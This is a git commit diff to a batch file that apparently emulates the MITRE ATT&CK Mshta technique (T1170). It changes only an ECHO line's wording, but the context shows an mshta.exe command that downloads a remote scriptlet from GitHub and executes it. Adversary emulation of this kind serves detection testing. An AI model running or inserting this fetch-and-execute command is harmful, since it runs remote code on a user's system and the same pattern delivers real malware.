f8094ffbd885fa2ab755b909b01cc189f446f2d0
rajrakeshdr <raj.rakeshdr@gmail.com>
2023-11-14 15:01:29 +0530

    Update T1170.bat

--- Payloads/T1170/T1170.bat
+++ Payloads/T1170/T1170.bat
@@ -6,7 +6,7 @@ color 0E
 ECHO ===========================================================================
 ECHO Technique: Mshta (T1170)
 ECHO.
-ECHO [+] Leveraging 'mshta.exe' to download & execute payload 
+ECHO [+] Leveraging 'mshta.exe' to download and execute payload 
 ECHO -------------------------------------------------------------------
 mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();
 ECHO.
